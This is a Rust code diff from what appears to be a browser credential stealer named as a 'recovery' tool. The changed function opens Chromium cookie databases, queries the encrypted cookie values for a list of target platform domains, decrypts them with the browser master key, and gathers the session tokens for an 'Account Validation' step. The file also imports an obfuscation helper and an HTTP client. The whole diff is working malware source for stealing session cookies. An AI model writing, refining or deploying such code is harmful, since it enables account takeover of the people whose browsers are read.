@@ -1,15 +1,15 @@
 use crate::recovery::helpers::obfuscation::deobf;
+use crate::recovery::helpers::winhttp::{Client, Error, Response};
 use crate::recovery::{
     browsers::{BrowserName, BrowserProfile, browser_data_roots},
     chromium,
     context::RecoveryContext,
     fs::sanitize_label,
+    helpers::sqlite,
     task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask},
 };
 use async_trait::async_trait;
 use once_cell::sync::Lazy;
-use crate::recovery::helpers::winhttp::{Client, Response, Error};
-use rusqlite::{Connection, params};
 use serde_json::{Value, json};
 use std::collections::HashSet;
 use std::env;
@@ -564,7 +564,6 @@ async fn write_validation_artifact(
 async fn account_validation_dir(ctx: &RecoveryContext) -> Result<PathBuf, RecoveryError> {
     let base = ctx
         .output_dir
-        .join("services")
         .join("Browsers")
         .join(sanitize_label("Account Validation"));
     fs::create_dir_all(&base).await?;
@@ -584,25 +583,22 @@ fn collect_tokens_from_db_sync(
     db_path: &Path,
     master_key: &[u8],
 ) -> Result<Vec<TokenCandidate>, RecoveryError> {
-    let connection = Connection::open(db_path).map_err(|err| sqlite_error("open", err))?;
+    let connection = sqlite::Connection::open(db_path).map_err(|err| RecoveryError::Custom(err))?;
 
     let mut tokens = Vec::new();
 
     for config in PLATFORM_CONFIGS.iter() {
         let mut statement = connection
             .prepare("SELECT encrypted_value FROM cookies WHERE host_key LIKE ?1 AND name = ?2")
-            .map_err(|err| sqlite_error("prepare", err))?;
+            .map_err(|err| RecoveryError::Custom(err))?;
 
         let pattern = format!("%{}%", config.domain);
-        let rows = statement
-            .query_map(params![pattern, config.cookie_name], |row| {
-                row.get::<_, Vec<u8>>(0)
-            })
-            .map_err(|err| sqlite_error("query", err))?;
+        let _ = statement.bind_text(1, &pattern);
+        let _ = statement.bind_text(2, &config.cookie_name);
 
-        for row in rows {
-            match row.map_err(|err| sqlite_error("row", err)) {
-                Ok(encrypted) => match chromium::decrypt_chromium_value(&encrypted, master_key) {
+        while let Ok(Some(row)) = statement.next() {
+            if let Some(encrypted) = row.get_blob(0) {
+                match chromium::decrypt_chromium_value(&encrypted, master_key) {
                     Ok(value) if !value.is_empty() => {
                         tokens.push(TokenCandidate {
                             platform: config.id,
@@ -613,19 +609,12 @@ fn collect_tokens_from_db_sync(
                     Err(err) => {
                         warn!(platform=?config.id, "cookie decryption failed: {err}");
                     }
-                },
-                Err(err) => {
-                    warn!(platform=?config.id, error=?err, "failed to read cookie row");
                 }
             }
         }
     }
 
     Ok(tokens)
-}
-
-fn sqlite_error(stage: &str, err: rusqlite::Error) -> RecoveryError {
-    RecoveryError::Custom(format!("sqlite {stage} error: {err}"))
 }
 
 fn sanitize_profile_name(name: &str) -> String {
